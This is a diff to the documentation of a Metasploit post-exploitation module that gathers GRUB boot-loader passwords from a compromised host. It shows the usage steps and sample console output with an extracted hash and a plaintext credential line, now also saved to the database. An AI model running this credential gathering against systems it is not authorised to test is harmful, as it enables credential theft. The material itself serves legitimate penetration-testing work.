@@ -9,7 +9,7 @@
   3. Do: `use post/multi/gather/grub_password`
   4. Do: `set SESSION <session id>`
   5. Do: `run`
-  6. The gathered passwords will be printed to the console. You should be able to see the extracted `grub.config` file in the loot files
+  6. The gathered passwords will be printed to the console and saved to the database. You should be able to see the extracted `grub.config` file in the loot files
 
 ## Options
 
@@ -27,10 +27,11 @@
 
   [*] Searching for GRUB config files..
   [*] Reading /boot/grub/grub.cfg
-  [+] Found password: password --md5 $1$TNUb/1$TwroGJn4eCd4xsYeGiBYq.
+  [*] No passwords found in GRUB config file: /boot/grub/grub.cfg
   [+] /boot/grub/grub.cfg saved to /home/user/.msf4/loot/20190217212515_default_172.25.14.160_grub.config_675306.txt
   [*] Reading /etc/grub.d/00_header
-  [*] No passwords found in GRUB config file: /etc/grub.d/00_header
+  [*] Found password: password John foo
+  [+] Saved credentials
   [+] /etc/grub.d/00_header saved to /home/user/.msf4/loot/20190217212517_default_172.25.14.160_grub.config_259839.txt
   [*] Post module execution completed
   ```
